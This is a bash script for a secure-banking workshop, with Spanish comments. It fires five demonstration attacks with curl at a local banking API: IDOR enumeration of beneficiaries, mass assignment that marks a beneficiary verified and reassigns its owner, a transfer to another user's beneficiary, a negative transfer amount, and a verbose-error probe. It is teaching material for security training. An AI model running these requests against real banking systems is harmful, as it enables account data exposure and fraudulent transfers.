#!/usr/bin/env bash
# Taller Banca Segura IA - ataques de demostracion. SOLO contra localhost.
BASE=${BASE:-http://localhost:8080}
ANA="ana:ana123"

echo "== 1) IDOR por enumeracion: ana recorre ids 88..95"
for id in $(seq 88 95); do
  code=$(curl -s -o /tmp/ben_$id.json -w "%{http_code}" -u "$ANA" "$BASE/api/beneficiaries/$id")
  echo "id=$id -> HTTP $code $(head -c 160 /tmp/ben_$id.json)"
done

echo; echo "== 2) Mass assignment: status=VERIFIED, internalRiskScore=0, customerId=2"
curl -s -u "$ANA" -H "Content-Type: application/json" -X POST "$BASE/api/beneficiaries" \
  -d '{"alias":"Mula","holderName":"Tercero","holderRut":"77777777-7","bankCode":"016","accountNumber":"000999888777","status":"VERIFIED","internalRiskScore":0,"customerId":2}'
echo

echo; echo "== 3) Transferencia a beneficiario ajeno (UUID valido de bruno)"
curl -s -u "$ANA" -H "Content-Type: application/json" -X POST "$BASE/api/transfers" \
  -d '{"beneficiaryId":"7b2e9d14-6a3c-4f8e-b1d5-2c9a8e4f9102","amount":10000,"currency":"CLP"}'
echo

echo; echo "== 4) Monto negativo"
curl -s -u "$ANA" -H "Content-Type: application/json" -X POST "$BASE/api/transfers" \
  -d '{"beneficiaryId":"3f6c1a52-8d4e-4b1a-9c2f-5a7e1d0b9001","amount":-50000,"currency":"CLP"}'
echo

echo; echo "== 5) Error verboso"
curl -s -u "$ANA" "$BASE/api/beneficiaries/9999" | head -c 600
echo; echo; echo "Revise ahora la consola de la aplicacion: que quedo registrado en los logs?"
